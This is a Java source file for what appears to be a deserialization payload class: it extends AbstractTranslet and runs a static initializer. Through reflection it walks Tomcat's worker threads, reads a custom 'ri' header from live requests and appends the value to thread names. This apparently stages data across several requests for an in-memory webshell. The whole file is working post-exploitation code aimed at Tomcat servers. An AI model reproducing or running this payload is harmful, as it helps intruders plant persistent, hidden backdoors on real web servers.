import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.List;

public class MemThread extends AbstractTranslet {
    static {
        try {
            Thread[] var5 = (Thread[]) getFV(Thread.currentThread().getThreadGroup(), "threads");
            for (int var6 = 0; var6 < var5.length; var6++) {
                Thread var7 = var5[var6];
                if (var7!=null) {
                    String var3 = var7.getName();
                    if (!var3.contains("exec") && var3.contains("http") || var3.contains("r1cky")) {
                        Object var1 = getFV(var7, "target");
                        if (var1 instanceof Runnable) {
                            var1 = getFV(getFV(getFV(var1, "this$0"), "handler"), "global");
                            List var9 = (List) getFV(var1, "processors");
                            for (int var10 = 0; var10 < var9.size(); var10++) {
                                Request var11 = (Request) getFV(var9.get(var10), "req");
                                org.apache.catalina.connector.Request req = (org.apache.catalina.connector.Request) var11.getNote(1);
//                                org.apache.catalina.connector.Response resp = req.getResponse();
                                String s = req.getHeader("ri");
                                if(s.equals("r1cky")) var7.setName("r1cky");
                                // 多次写入
                                var7.setName(var7.getName() + s);
                            }
                        }
                    }
                }
            }
        }catch (Exception e){
        }
    }
    private static Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class<?> var3 = var0.getClass();
        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }
        if (var2 == null)
            throw new NoSuchFieldException(var1);
        var2.setAccessible(true);
        return var2.get(var0);
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
